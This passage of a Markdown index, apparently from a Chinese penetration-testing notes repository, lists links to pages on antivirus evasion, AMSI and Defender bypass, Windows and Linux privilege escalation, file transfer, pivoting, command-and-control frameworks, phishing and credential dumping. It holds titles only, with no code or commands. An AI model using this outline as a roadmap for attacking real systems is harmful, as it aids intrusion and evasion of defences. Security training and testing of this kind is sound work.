    - [XOR和AES编码](https://github.com/xiaoy-sec/Pentest_Note/blob/master/wiki/防御规避/C#源码免杀/XOR和AES编码.md)
  - [Python源码免杀](https://github.com/xiaoy-sec/Pentest_Note/blob/master/wiki/防御规避/Python源码免杀/README.md)
    - [pyinstaller加载C代码编译](https://github.com/xiaoy-sec/Pentest_Note/blob/master/wiki/防御规避/Python源码免杀/pyinstaller加载C代码编译.md)
    - [加载器分离](https://github.com/xiaoy-sec/Pentest_Note/blob/master/wiki/防御规避/Python源码免杀/加载器分离.md)
    - [Base64编码+Pyinstaller打包](https://github.com/xiaoy-sec/Pentest_Note/blob/master/wiki/防御规避/Python源码免杀/Base64编码+Pyinstaller打包.md)
    - [pyinstaller加载py代码编译](https://github.com/xiaoy-sec/Pentest_Note/blob/master/wiki/防御规避/Python源码免杀/pyinstaller加载py代码编译.md)
  - [Powershell免杀](https://github.com/xiaoy-sec/Pentest_Note/blob/master/wiki/防御规避/Powershell免杀/README.md)
    - [行为检测](https://github.com/xiaoy-sec/Pentest_Note/blob/master/wiki/防御规避/Powershell免杀/行为检测.md)
    - [分块免杀](https://github.com/xiaoy-sec/Pentest_Note/blob/master/wiki/防御规避/Powershell免杀/分块免杀.md)
    - [拆分+C编译](https://github.com/xiaoy-sec/Pentest_Note/blob/master/wiki/防御规避/Powershell免杀/拆分+C编译.md)
    - [CobaltStrike+Powershell免杀](https://github.com/xiaoy-sec/Pentest_Note/blob/master/wiki/防御规避/Powershell免杀/CobaltStrike+Powershell免杀.md)
    - [Out-EncryptedScript](https://github.com/xiaoy-sec/Pentest_Note/blob/master/wiki/防御规避/Powershell免杀/Out-EncryptedScript.md)
    - [Invoke-Shellcode](https://github.com/xiaoy-sec/Pentest_Note/blob/master/wiki/防御规避/Powershell免杀/Invoke-Shellcode.md)
    - [Invoke-Obfuscation](https://github.com/xiaoy-sec/Pentest_Note/blob/master/wiki/防御规避/Powershell免杀/obfuscation.md)
    - [直接生成](https://github.com/xiaoy-sec/Pentest_Note/blob/master/wiki/防御规避/Powershell免杀/直接生成.md)
    - [PyFuscation](https://github.com/xiaoy-sec/Pentest_Note/blob/master/wiki/防御规避/Powershell免杀/PyFuscation.md)
    - [Xencrypt](https://github.com/xiaoy-sec/Pentest_Note/blob/master/wiki/防御规避/Powershell免杀/Xencrypt.md)
  - [the-backdoor-factory](https://github.com/xiaoy-sec/Pentest_Note/blob/master/wiki/防御规避/the-backdoor-factory.md)
  - [捆绑器](https://github.com/xiaoy-sec/Pentest_Note/blob/master/wiki/防御规避/捆绑器.md)
  - [DLL劫持](https://github.com/xiaoy-sec/Pentest_Note/blob/master/wiki/防御规避/DLL劫持.md)
  - [Evasion模块](https://github.com/xiaoy-sec/Pentest_Note/blob/master/wiki/防御规避/Evasion模块.md)
  - [Golang](https://github.com/xiaoy-sec/Pentest_Note/blob/master/wiki/防御规避/Golang.md)
  - [GreatSCT](https://github.com/xiaoy-sec/Pentest_Note/blob/master/wiki/防御规避/GreatSCT.md)
  - [hanzoInjection](https://github.com/xiaoy-sec/Pentest_Note/blob/master/wiki/防御规避/hanzoInjection.md)
  - [InstallUtil](https://github.com/xiaoy-sec/Pentest_Note/blob/master/wiki/防御规避/InstallUtil.md)
  - [加载器免杀](https://github.com/xiaoy-sec/Pentest_Note/blob/master/wiki/防御规避/加载器免杀/README.md)
    - [shellcode_launcher](https://github.com/xiaoy-sec/Pentest_Note/blob/master/wiki/防御规避/加载器免杀/shellcode_launcher.md)
    - [SSI加载](https://github.com/xiaoy-sec/Pentest_Note/blob/master/wiki/防御规避/加载器免杀/SSI加载.md)
  - [MSBuilt](https://github.com/xiaoy-sec/Pentest_Note/blob/master/wiki/防御规避/MSBuilt.md)
  - [MSF捆绑](https://github.com/xiaoy-sec/Pentest_Note/blob/master/wiki/防御规避/MSF捆绑.md)
  - [MSF+shellcode免杀](https://github.com/xiaoy-sec/Pentest_Note/blob/master/wiki/防御规避/MSF+shellcode免杀/README.md)
    - [c和c++源码免杀](https://github.com/xiaoy-sec/Pentest_Note/blob/master/wiki/防御规避/MSF+shellcode免杀/c和c++源码免杀.md)
    - [编码器](https://github.com/xiaoy-sec/Pentest_Note/blob/master/wiki/防御规避/MSF+shellcode免杀/编码器.md)
    - [nps_payload](https://github.com/xiaoy-sec/Pentest_Note/blob/master/wiki/防御规避/MSF+shellcode免杀/nps_payload.md)
  - [Mshta](https://github.com/xiaoy-sec/Pentest_Note/blob/master/wiki/防御规避/Mshta.md)
  - [Phantom-Evasion](https://github.com/xiaoy-sec/Pentest_Note/blob/master/wiki/防御规避/Phantom-Evasion.md)
  - [RC4](https://github.com/xiaoy-sec/Pentest_Note/blob/master/wiki/防御规避/RC4.md)
  - [Ruby](https://github.com/xiaoy-sec/Pentest_Note/blob/master/wiki/防御规避/Ruby.md)
  - [Shellter](https://github.com/xiaoy-sec/Pentest_Note/blob/master/wiki/防御规避/Shellter.md)
  - [Veil](https://github.com/xiaoy-sec/Pentest_Note/blob/master/wiki/防御规避/Veil.md)
  - [zirikatu](https://github.com/xiaoy-sec/Pentest_Note/blob/master/wiki/防御规避/zirikatu.md)
  - [carboncopy](https://github.com/xiaoy-sec/Pentest_Note/blob/master/wiki/防御规避/carboncopy.md)
  - [avet](https://github.com/xiaoy-sec/Pentest_Note/blob/master/wiki/防御规避/avet.md)
  - [c代码加载图片马](https://github.com/xiaoy-sec/Pentest_Note/blob/master/wiki/防御规避/c代码加载图片马.md)
  - [Bypass AMSI](https://github.com/xiaoy-sec/Pentest_Note/blob/master/wiki/防御规避/Bypass-AMSI.md)
  - [一些可尝试绕过白名单的执行](https://github.com/xiaoy-sec/Pentest_Note/blob/master/wiki/防御规避/一些可尝试绕过白名单的执行.md)
  - [在Windows Server 2016和2019中绕过WindowsDefender](https://github.com/xiaoy-sec/Pentest_Note/blob/master/wiki/防御规避/在Windows-Server-2016和2019中绕过WindowsDefender.md)
  - [cshot远程shellcode](https://github.com/xiaoy-sec/Pentest_Note/blob/master/wiki/防御规避/cshot远程shellcode.md)
  - [内存中解码shellcode绕过av](https://github.com/xiaoy-sec/Pentest_Note/blob/master/wiki/防御规避/内存中解码shellcode绕过av.md)
  - [Pezor免杀](https://github.com/xiaoy-sec/Pentest_Note/blob/master/wiki/防御规避/Pezor免杀.md)
  - [绕过安全狗脚本](https://github.com/xiaoy-sec/Pentest_Note/blob/master/wiki/防御规避/绕过安全狗脚本.md)
  - [360白名单](https://github.com/xiaoy-sec/Pentest_Note/blob/master/wiki/防御规避/360白名单.md)

- [权限提升](https://github.com/xiaoy-sec/Pentest_Note/blob/master/wiki/权限提升/README.md)
  - [Windows提权](https://github.com/xiaoy-sec/Pentest_Note/blob/master/wiki/权限提升/Windows提权/README.md)
    - [RDP&Firewall](https://github.com/xiaoy-sec/Pentest_Note/blob/master/wiki/权限提升/Windows提权/RDP&Firewall/README.md)
      - [爆破RDP](https://github.com/xiaoy-sec/Pentest_Note/blob/master/wiki/权限提升/Windows提权/RDP&Firewall/爆破RDP.md)
      - [注册表开启](https://github.com/xiaoy-sec/Pentest_Note/blob/master/wiki/权限提升/Windows提权/RDP&Firewall/注册表开启.md)
      - [防火墙](https://github.com/xiaoy-sec/Pentest_Note/blob/master/wiki/权限提升/Windows提权/RDP&Firewall/防火墙.md)
      - [注入点开启](https://github.com/xiaoy-sec/Pentest_Note/blob/master/wiki/权限提升/Windows提权/RDP&Firewall/注入点开启.md)
      - [MSF开启](https://github.com/xiaoy-sec/Pentest_Note/blob/master/wiki/权限提升/Windows提权/RDP&Firewall/MSF开启.md)
      - [wmic开启](https://github.com/xiaoy-sec/Pentest_Note/blob/master/wiki/权限提升/Windows提权/RDP&Firewall/wmic开启.md)
      - [多用户登陆](https://github.com/xiaoy-sec/Pentest_Note/blob/master/wiki/权限提升/Windows提权/RDP&Firewall/多用户登陆.md)
      - [RDP连接记录](https://github.com/xiaoy-sec/Pentest_Note/blob/master/wiki/权限提升/Windows提权/RDP&Firewall/RDP连接记录.md)
      - [删除痕迹](https://github.com/xiaoy-sec/Pentest_Note/blob/master/wiki/权限提升/Windows提权/RDP&Firewall/删除痕迹.md)
    - [impactet工具包](https://github.com/xiaoy-sec/Pentest_Note/blob/master/wiki/权限提升/Windows提权/impactet工具包.md)
    - [Windows-exploit-suggester](https://github.com/xiaoy-sec/Pentest_Note/blob/master/wiki/权限提升/Windows提权/Windows-exploit-suggester.md)
    - [Wesng](https://github.com/xiaoy-sec/Pentest_Note/blob/master/wiki/权限提升/Windows提权/Wesng.md)
    - [Searchsploit](https://github.com/xiaoy-sec/Pentest_Note/blob/master/wiki/权限提升/Windows提权/Searchsploit.md)
    - [激活guest](https://github.com/xiaoy-sec/Pentest_Note/blob/master/wiki/权限提升/Windows提权/激活guest.md)
    - [MYSQLudf](https://github.com/xiaoy-sec/Pentest_Note/blob/master/wiki/权限提升/Windows提权/MYSQLudf.md)
    - [MSSQL](https://github.com/xiaoy-sec/Pentest_Note/blob/master/wiki/权限提升/Windows提权/MSSQL.md)
    - [MSF](https://github.com/xiaoy-sec/Pentest_Note/blob/master/wiki/权限提升/Windows提权/MSF.md)
    - [BypassUAC](https://github.com/xiaoy-sec/Pentest_Note/blob/master/wiki/权限提升/Windows提权/BypassUAC.md)
    - [Whitelist白名单](https://github.com/xiaoy-sec/Pentest_Note/blob/master/wiki/权限提升/Windows提权/Whitelist白名单.md)
    - [Powerup-AlwaysInstallElevated](https://github.com/xiaoy-sec/Pentest_Note/blob/master/wiki/权限提升/Windows提权/Powerup-AlwaysInstallElevated.md)
    - [AlwaysInstallElevated提权](https://github.com/xiaoy-sec/Pentest_Note/blob/master/wiki/权限提升/Windows提权/AlwaysInstallElevated提权.md)
    - [密码窃取](https://github.com/xiaoy-sec/Pentest_Note/blob/master/wiki/权限提升/Windows提权/密码窃取.md)
    - [RottenPotato](https://github.com/xiaoy-sec/Pentest_Note/blob/master/wiki/权限提升/Windows提权/RottenPotato.md)
    - [PowerUp](https://github.com/xiaoy-sec/Pentest_Note/blob/master/wiki/权限提升/Windows提权/PowerUp.md)
    - [Runas](https://github.com/xiaoy-sec/Pentest_Note/blob/master/wiki/权限提升/Windows提权/Runas.md)
    - [令牌窃取](https://github.com/xiaoy-sec/Pentest_Note/blob/master/wiki/权限提升/Windows提权/令牌窃取.md)
    - [未引用的服务路径](https://github.com/xiaoy-sec/Pentest_Note/blob/master/wiki/权限提升/Windows提权/未引用的服务路径.md)
    - [Vulnerable-Services](https://github.com/xiaoy-sec/Pentest_Note/blob/master/wiki/权限提升/Windows提权/Vulnerable-Services.md)
    - [DNS组到DomainAdmin](https://github.com/xiaoy-sec/Pentest_Note/blob/master/wiki/权限提升/Windows提权/DNS组到DomainAdmin.md)
    - [HiveNightmare](https://github.com/xiaoy-sec/Pentest_Note/blob/master/wiki/权限提升/Windows提权/HiveNightmare.md)
    - [PrintNightmare](https://github.com/xiaoy-sec/Pentest_Note/blob/master/wiki/权限提升/Windows提权/PrintNightmare.md)
    - [SamAccountSpoofing](https://github.com/xiaoy-sec/Pentest_Note/blob/master/wiki/权限提升/Windows提权/SamAccountSpoofing.md)
    - [SeBackupPrivilege](https://github.com/xiaoy-sec/Pentest_Note/blob/master/wiki/权限提升/Windows提权/SeBackupPrivilege.md)
    - [SeImpersonatePrivilege](https://github.com/xiaoy-sec/Pentest_Note/blob/master/wiki/权限提升/Windows提权/SeImpersonatePrivilege.md)
    - [SpoolFool](https://github.com/xiaoy-sec/Pentest_Note/blob/master/wiki/权限提升/Windows提权/SpoolFool.md)
    - [弱注册表权限](https://github.com/xiaoy-sec/Pentest_Note/blob/master/wiki/权限提升/Windows提权/弱注册表权限.md)
    - [CVE-2020-1472](https://github.com/xiaoy-sec/Pentest_Note/blob/master/wiki/权限提升/Windows提权/CVE-2020-1472.md)
    - [AppLocker](https://github.com/xiaoy-sec/Pentest_Note/blob/master/wiki/权限提升/Windows提权/AppLocker.md)
    - [DLL劫持](https://github.com/xiaoy-sec/Pentest_Note/blob/master/wiki/权限提升/Windows提权/DLL劫持.md)
    - [EFSPotato](https://github.com/xiaoy-sec/Pentest_Note/blob/master/wiki/权限提升/Windows提权/EFSPotato.md)
    - [JuicyPotato](https://github.com/xiaoy-sec/Pentest_Note/blob/master/wiki/权限提升/Windows提权/JuicyPotato.md)
    - [RoguePotato](https://github.com/xiaoy-sec/Pentest_Note/blob/master/wiki/权限提升/Windows提权/RoguePotato.md)
    - [watson](https://github.com/xiaoy-sec/Pentest_Note/blob/master/wiki/权限提升/Windows提权/watson.md)
    - [WSL子系统](https://github.com/xiaoy-sec/Pentest_Note/blob/master/wiki/权限提升/Windows提权/WSL子系统.md)
    - [本机文件和脚本](https://github.com/xiaoy-sec/Pentest_Note/blob/master/wiki/权限提升/Windows提权/本机文件和脚本.md)
    - [不安全的GUI应用程序](https://github.com/xiaoy-sec/Pentest_Note/blob/master/wiki/权限提升/Windows提权/不安全的GUI应用程序.md)
    - [从administrator到system](https://github.com/xiaoy-sec/Pentest_Note/blob/master/wiki/权限提升/Windows提权/从administrator到system.md)
    - [打印机漏洞](https://github.com/xiaoy-sec/Pentest_Note/blob/master/wiki/权限提升/Windows提权/打印机漏洞.md)
    - [服务中的不正确权限](https://github.com/xiaoy-sec/Pentest_Note/blob/master/wiki/权限提升/Windows提权/服务中的不正确权限.md)
    - [环境变量优先](https://github.com/xiaoy-sec/Pentest_Note/blob/master/wiki/权限提升/Windows提权/环境变量优先.md)
    - [恢复服务帐户的权限](https://github.com/xiaoy-sec/Pentest_Note/blob/master/wiki/权限提升/Windows提权/恢复服务帐户的权限.md)
    - [弱权限的PATH目录](https://github.com/xiaoy-sec/Pentest_Note/blob/master/wiki/权限提升/Windows提权/弱权限的PATH目录.md)
    - [特权文件写入](https://github.com/xiaoy-sec/Pentest_Note/blob/master/wiki/权限提升/Windows提权/特权文件写入.md)
    - [未引用的服务路径](https://github.com/xiaoy-sec/Pentest_Note/blob/master/wiki/权限提升/Windows提权/未引用的服务路径.md)
  - [Linux提权](https://github.com/xiaoy-sec/Pentest_Note/blob/master/wiki/权限提升/Linux提权/README.md)
    - [查找辅助信息](https://github.com/xiaoy-sec/Pentest_Note/blob/master/wiki/权限提升/Linux提权/查找辅助信息.md)
    - [查找可能泄露的密码](https://github.com/xiaoy-sec/Pentest_Note/blob/master/wiki/权限提升/Linux提权/查找可能泄露的密码.md)
    - [Linux-Exploit-Suggester](https://github.com/xiaoy-sec/Pentest_Note/blob/master/wiki/权限提升/Linux提权/Linux-Exploit-Suggester.md)
    - [一些检测工具](https://github.com/xiaoy-sec/Pentest_Note/blob/master/wiki/权限提升/Linux提权/一些检测工具.md)
    - [Linux计划任务](https://github.com/xiaoy-sec/Pentest_Note/blob/master/wiki/权限提升/Linux提权/Linux计划任务.md)
    - [可写文件提权](https://github.com/xiaoy-sec/Pentest_Note/blob/master/wiki/权限提升/Linux提权/可写文件提权.md)
    - [Sudo提权](https://github.com/xiaoy-sec/Pentest_Note/blob/master/wiki/权限提升/Linux提权/Sudo提权.md)
    - [Linux SUID提权](https://github.com/xiaoy-sec/Pentest_Note/blob/master/wiki/权限提升/Linux提权/LinuxSUID提权.md)
    - [漏洞提权](https://github.com/xiaoy-sec/Pentest_Note/blob/master/wiki/权限提升/Linux提权/漏洞提权.md)
    - [MYSQL-Linux-Root](https://github.com/xiaoy-sec/Pentest_Note/blob/master/wiki/权限提升/Linux提权/MYSQL-Linux-Root.md)
    - [LD_Preload提权](https://github.com/xiaoy-sec/Pentest_Note/blob/master/wiki/权限提升/Linux提权/LD_Preload.md)
    - [Lxd提权](https://github.com/xiaoy-sec/Pentest_Note/blob/master/wiki/权限提升/Linux提权/Lxd提权.md)
    - [MYSQL漏洞](https://github.com/xiaoy-sec/Pentest_Note/blob/master/wiki/权限提升/Linux提权/MYSQL漏洞.md)
    - [环境变量提权](https://github.com/xiaoy-sec/Pentest_Note/blob/master/wiki/权限提升/Linux提权/环境变量提权.md)
    - [通配符提权](https://github.com/xiaoy-sec/Pentest_Note/blob/master/wiki/权限提升/Linux提权/通配符提权.md)

- [文件操作](https://github.com/xiaoy-sec/Pentest_Note/blob/master/wiki/文件操作/README.md)
  - [创建](https://github.com/xiaoy-sec/Pentest_Note/blob/master/wiki/文件操作/创建.md)
  - [Windows查找文件](https://github.com/xiaoy-sec/Pentest_Note/blob/master/wiki/文件操作/Windows查找文件.md)
  - [Linux查找文件](https://github.com/xiaoy-sec/Pentest_Note/blob/master/wiki/文件操作/Linux查找文件.md)
  - [解压](https://github.com/xiaoy-sec/Pentest_Note/blob/master/wiki/文件操作/解压.md)
  - [远程解压文件](https://github.com/xiaoy-sec/Pentest_Note/blob/master/wiki/文件操作/远程解压文件.md)
  - [压缩](https://github.com/xiaoy-sec/Pentest_Note/blob/master/wiki/文件操作/压缩.md)
  - [查找可写目录](https://github.com/xiaoy-sec/Pentest_Note/blob/master/wiki/文件操作/查找可写目录.md)
  - [传输](https://github.com/xiaoy-sec/Pentest_Note/blob/master/wiki/文件操作/传输/README.md)
    - [Bitsadmin](https://github.com/xiaoy-sec/Pentest_Note/blob/master/wiki/文件操作/传输/bitsadmin.md)
    - [Certutil](https://github.com/xiaoy-sec/Pentest_Note/blob/master/wiki/文件操作/传输/certutil.md)
    - [Curl](https://github.com/xiaoy-sec/Pentest_Note/blob/master/wiki/文件操作/传输/curl.md)
    - [Ftp](https://github.com/xiaoy-sec/Pentest_Note/blob/master/wiki/文件操作/传输/ftp.md)
    - [JS](https://github.com/xiaoy-sec/Pentest_Note/blob/master/wiki/文件操作/传输/js.md)
    - [nc](https://github.com/xiaoy-sec/Pentest_Note/blob/master/wiki/文件操作/传输/nc.md)
    - [perl](https://github.com/xiaoy-sec/Pentest_Note/blob/master/wiki/文件操作/传输/perl.md)
    - [php](https://github.com/xiaoy-sec/Pentest_Note/blob/master/wiki/文件操作/传输/php.md)
    - [powershell](https://github.com/xiaoy-sec/Pentest_Note/blob/master/wiki/文件操作/传输/powershell.md)
    - [py](https://github.com/xiaoy-sec/Pentest_Note/blob/master/wiki/文件操作/传输/py.md)
    - [SCP](https://github.com/xiaoy-sec/Pentest_Note/blob/master/wiki/文件操作/传输/scp.md)
    - [vbs](https://github.com/xiaoy-sec/Pentest_Note/blob/master/wiki/文件操作/传输/vbs.md)
    - [wget](https://github.com/xiaoy-sec/Pentest_Note/blob/master/wiki/文件操作/传输/wget.md)
    - [WindowsDefender](https://github.com/xiaoy-sec/Pentest_Note/blob/master/wiki/文件操作/传输/WindowsDefender.md)

- [内网和域](https://github.com/xiaoy-sec/Pentest_Note/blob/master/wiki/内网和域/README.md)
  - [信息搜集](https://github.com/xiaoy-sec/Pentest_Note/blob/master/wiki/内网和域/信息搜集/README.md)
    - [Windows安全标识符SID](https://github.com/xiaoy-sec/Pentest_Note/blob/master/wiki/内网和域/信息搜集/Windows安全标识符SID.md)
    - [Powershell基础操作](https://github.com/xiaoy-sec/Pentest_Note/blob/master/wiki/内网和域/信息搜集/Powershell基础操作.md)
    - [Cmd](https://github.com/xiaoy-sec/Pentest_Note/blob/master/wiki/内网和域/信息搜集/Cmd.md)
    - [Linux](https://github.com/xiaoy-sec/Pentest_Note/blob/master/wiki/内网和域/信息搜集/Linux.md)
    - [Powerview](https://github.com/xiaoy-sec/Pentest_Note/blob/master/wiki/内网和域/信息搜集/Powerview.md)
    - [BloodHoundAD](https://github.com/xiaoy-sec/Pentest_Note/blob/master/wiki/内网和域/信息搜集/BloodHoundAD.md)
    - [ADDomain](https://github.com/xiaoy-sec/Pentest_Note/blob/master/wiki/内网和域/信息搜集/ADDomain.md)
    - [临时HTTP服务架设](https://github.com/xiaoy-sec/Pentest_Note/blob/master/wiki/内网和域/信息搜集/临时HTTP服务架设.md)
    - [Wmi](https://github.com/xiaoy-sec/Pentest_Note/blob/master/wiki/内网和域/信息搜集/Wmi.md)
  - [端口映射和转发](https://github.com/xiaoy-sec/Pentest_Note/blob/master/wiki/内网和域/端口映射和转发/README.md)
    - [chisel](https://github.com/xiaoy-sec/Pentest_Note/blob/master/wiki/内网和域/端口映射和转发/chisel.md)
    - [iptables](https://github.com/xiaoy-sec/Pentest_Note/blob/master/wiki/内网和域/端口映射和转发/iptables.md)
    - [lcx](https://github.com/xiaoy-sec/Pentest_Note/blob/master/wiki/内网和域/端口映射和转发/lcx.md)
    - [msf](https://github.com/xiaoy-sec/Pentest_Note/blob/master/wiki/内网和域/端口映射和转发/msf.md)
    - [netsh](https://github.com/xiaoy-sec/Pentest_Note/blob/master/wiki/内网和域/端口映射和转发/netsh.md)
    - [ssf](https://github.com/xiaoy-sec/Pentest_Note/blob/master/wiki/内网和域/端口映射和转发/ssf.md)
    - [ssh](https://github.com/xiaoy-sec/Pentest_Note/blob/master/wiki/内网和域/端口映射和转发/ssh.md)
    - [SharpChisel](https://github.com/xiaoy-sec/Pentest_Note/blob/master/wiki/内网和域/端口映射和转发/SharpChisel.md)
    - [Ligolo](https://github.com/xiaoy-sec/Pentest_Note/blob/master/wiki/内网和域/端口映射和转发/Ligolo.md)
  - [命令与控制](https://github.com/xiaoy-sec/Pentest_Note/blob/master/wiki/内网和域/命令与控制/README.md)
    - [Metasploit](https://github.com/xiaoy-sec/Pentest_Note/blob/master/wiki/内网和域/命令与控制/Metasploit/README.md)
      - [常规使用](https://github.com/xiaoy-sec/Pentest_Note/blob/master/wiki/内网和域/命令与控制/Metasploit/常规使用.md)
      - [细节使用](https://github.com/xiaoy-sec/Pentest_Note/blob/master/wiki/内网和域/命令与控制/Metasploit/细节使用.md)
      - [模块](https://github.com/xiaoy-sec/Pentest_Note/blob/master/wiki/内网和域/命令与控制/Metasploit/模块.md)
      - [meterpreter](https://github.com/xiaoy-sec/Pentest_Note/blob/master/wiki/内网和域/命令与控制/Metasploit/meterpreter.md)
      - [与cs和empire交互](https://github.com/xiaoy-sec/Pentest_Note/blob/master/wiki/内网和域/命令与控制/Metasploit/与cs和empire交互.md)
    - [CobaltStrike](https://github.com/xiaoy-sec/Pentest_Note/blob/master/wiki/内网和域/命令与控制/CobaltStrike/README.md)
      - [安装](https://github.com/xiaoy-sec/Pentest_Note/blob/master/wiki/内网和域/命令与控制/CobaltStrike/安装.md)
      - [部署](https://github.com/xiaoy-sec/Pentest_Note/blob/master/wiki/内网和域/命令与控制/CobaltStrike/部署.md)
      - [模块](https://github.com/xiaoy-sec/Pentest_Note/blob/master/wiki/内网和域/命令与控制/CobaltStrike/模块.md)
      - [连接](https://github.com/xiaoy-sec/Pentest_Note/blob/master/wiki/内网和域/命令与控制/CobaltStrike/连接.md)
      - [监听](https://github.com/xiaoy-sec/Pentest_Note/blob/master/wiki/内网和域/命令与控制/CobaltStrike/监听.md)
      - [攻击模块](https://github.com/xiaoy-sec/Pentest_Note/blob/master/wiki/内网和域/命令与控制/CobaltStrike/攻击模块.md)
      - [视图模块](https://github.com/xiaoy-sec/Pentest_Note/blob/master/wiki/内网和域/命令与控制/CobaltStrike/视图模块.md)
      - [交互](https://github.com/xiaoy-sec/Pentest_Note/blob/master/wiki/内网和域/命令与控制/CobaltStrike/交互.md)
      - [Beacon](https://github.com/xiaoy-sec/Pentest_Note/blob/master/wiki/内网和域/命令与控制/CobaltStrike/Beacon.md)
      - [克隆](https://github.com/xiaoy-sec/Pentest_Note/blob/master/wiki/内网和域/命令与控制/CobaltStrike/克隆.md)
      - [office宏](https://github.com/xiaoy-sec/Pentest_Note/blob/master/wiki/内网和域/命令与控制/CobaltStrike/office宏.md)
      - [钓鱼邮件](https://github.com/xiaoy-sec/Pentest_Note/blob/master/wiki/内网和域/命令与控制/CobaltStrike/钓鱼邮件.md)
      - [加载脚本](https://github.com/xiaoy-sec/Pentest_Note/blob/master/wiki/内网和域/命令与控制/CobaltStrike/加载脚本.md)
      - [浏览器劫持](https://github.com/xiaoy-sec/Pentest_Note/blob/master/wiki/内网和域/命令与控制/CobaltStrike/浏览器劫持.md)
      - [权限维持](https://github.com/xiaoy-sec/Pentest_Note/blob/master/wiki/内网和域/命令与控制/CobaltStrike/权限维持.md)
      - [横向移动](https://github.com/xiaoy-sec/Pentest_Note/blob/master/wiki/内网和域/命令与控制/CobaltStrike/横向移动.md)
      - [隔离网络](https://github.com/xiaoy-sec/Pentest_Note/blob/master/wiki/内网和域/命令与控制/CobaltStrike/隔离网络.md)
      - [代理](https://github.com/xiaoy-sec/Pentest_Note/blob/master/wiki/内网和域/命令与控制/CobaltStrike/代理.md)
      - [Malleable C2](https://github.com/xiaoy-sec/Pentest_Note/blob/master/wiki/内网和域/命令&控制/CobaltStrike/Malleable-C2.md)
      - [部署VPN](https://github.com/xiaoy-sec/Pentest_Note/blob/master/wiki/内网和域/命令与控制/CobaltStrike/部署VPN.md)
      - [与msf和empire交互](https://github.com/xiaoy-sec/Pentest_Note/blob/master/wiki/内网和域/命令与控制/CobaltStrike/与msf和empire交互.md)
      - [上线提醒](https://github.com/xiaoy-sec/Pentest_Note/blob/master/wiki/内网和域/命令与控制/CobaltStrike/上线提醒.md)
    - [Empire](https://github.com/xiaoy-sec/Pentest_Note/blob/master/wiki/内网和域/命令与控制/Empire/README.md)
      - [安装](https://github.com/xiaoy-sec/Pentest_Note/blob/master/wiki/内网和域/命令与控制/Empire/安装.md)
      - [监听](https://github.com/xiaoy-sec/Pentest_Note/blob/master/wiki/内网和域/命令与控制/Empire/监听.md)
      - [生成](https://github.com/xiaoy-sec/Pentest_Note/blob/master/wiki/内网和域/命令与控制/Empire/生成.md)
      - [后门](https://github.com/xiaoy-sec/Pentest_Note/blob/master/wiki/内网和域/命令与控制/Empire/后门.md)
      - [连接靶机及其他操作](https://github.com/xiaoy-sec/Pentest_Note/blob/master/wiki/内网和域/命令与控制/Empire/连接靶机及其他操作.md)
      - [权限提升](https://github.com/xiaoy-sec/Pentest_Note/blob/master/wiki/内网和域/命令与控制/Empire/权限提升.md)
      - [横向移动](https://github.com/xiaoy-sec/Pentest_Note/blob/master/wiki/内网和域/命令与控制/Empire/横向移动.md)
      - [模块](https://github.com/xiaoy-sec/Pentest_Note/blob/master/wiki/内网和域/命令与控制/Empire/模块.md)
      - [与cs和msf交互](https://github.com/xiaoy-sec/Pentest_Note/blob/master/wiki/内网和域/命令与控制/Empire/与cs和msf交互.md)
      - [Empire_Word](https://github.com/xiaoy-sec/Pentest_Note/blob/master/wiki/内网和域/命令与控制/Empire/Empire_Word.md)
    - [交互式shell](https://github.com/xiaoy-sec/Pentest_Note/blob/master/wiki/内网和域/命令与控制/交互式shell.md)
    - [crackmap](https://github.com/xiaoy-sec/Pentest_Note/blob/master/wiki/内网和域/命令与控制/crackmap.md)
    - [CobaltStrike](https://github.com/xiaoy-sec/Pentest_Note/blob/master/wiki/内网和域/命令与控制/CobaltStrike.md)
    - [dnscat](https://github.com/xiaoy-sec/Pentest_Note/blob/master/wiki/内网和域/命令与控制/dnscat.md)
    - [DNS-TXT-Command](https://github.com/xiaoy-sec/Pentest_Note/blob/master/wiki/内网和域/命令与控制/DNS-TXT-Command.md)
    - [Empire](https://github.com/xiaoy-sec/Pentest_Note/blob/master/wiki/内网和域/命令与控制/Empire.md)
    - [Jsrat](https://github.com/xiaoy-sec/Pentest_Note/blob/master/wiki/内网和域/命令与控制/Jsrat.md)
    - [koadic](https://github.com/xiaoy-sec/Pentest_Note/blob/master/wiki/内网和域/命令与控制/koadic.md)
    - [MSF](https://github.com/xiaoy-sec/Pentest_Note/blob/master/wiki/内网和域/命令与控制/MSF.md)
    - [Openssl](https://github.com/xiaoy-sec/Pentest_Note/blob/master/wiki/内网和域/命令与控制/Openssl.md)
    - [Powershell](https://github.com/xiaoy-sec/Pentest_Note/blob/master/wiki/内网和域/命令与控制/Powershell.md)
    - [反弹shell](https://github.com/xiaoy-sec/Pentest_Note/blob/master/wiki/内网和域/命令与控制/反弹shell.md)
    - [SILENTTRINITY](https://github.com/xiaoy-sec/Pentest_Note/blob/master/wiki/内网和域/命令与控制/SILENTTRINITY.md)
    - [telegram](https://github.com/xiaoy-sec/Pentest_Note/blob/master/wiki/内网和域/命令与控制/telegram.md)
    - [browser](https://github.com/xiaoy-sec/Pentest_Note/blob/master/wiki/内网和域/命令与控制/browser.md)
    - [Gmail](https://github.com/xiaoy-sec/Pentest_Note/blob/master/wiki/内网和域/命令与控制/Gmail.md)
    - [Dropbox](https://github.com/xiaoy-sec/Pentest_Note/blob/master/wiki/内网和域/命令与控制/Dropbox.md)
    - [工具](https://github.com/xiaoy-sec/Pentest_Note/blob/master/wiki/内网和域/命令与控制/工具.md)
    - [下载并执行](https://github.com/xiaoy-sec/Pentest_Note/blob/master/wiki/内网和域/命令与控制/下载并执行.md)

- [HASH操作](https://github.com/xiaoy-sec/Pentest_Note/blob/master/wiki/HASH操作/README.md)
  - [密码破解网站](https://github.com/xiaoy-sec/Pentest_Note/blob/master/wiki/HASH操作/密码破解网站.md)
  - [GoogleColab破解HASH操作](https://github.com/xiaoy-sec/Pentest_Note/blob/master/wiki/HASH操作/GoogleColab破解HASH操作.md)
  - [密码策略](https://github.com/xiaoy-sec/Pentest_Note/blob/master/wiki/HASH操作/密码策略.md)
  - [开启Wdigest](https://github.com/xiaoy-sec/Pentest_Note/blob/master/wiki/HASH操作/开启Wdigest.md)
  - [Getpass](https://github.com/xiaoy-sec/Pentest_Note/blob/master/wiki/HASH操作/Getpass.md)
  - [QuarksPwDump](https://github.com/xiaoy-sec/Pentest_Note/blob/master/wiki/HASH操作/QuarksPwDump.md)
  - [MSF](https://github.com/xiaoy-sec/Pentest_Note/blob/master/wiki/HASH操作/MSF.md)
  - [mimikatz](https://github.com/xiaoy-sec/Pentest_Note/blob/master/wiki/HASH操作/mimikatz/README.md)
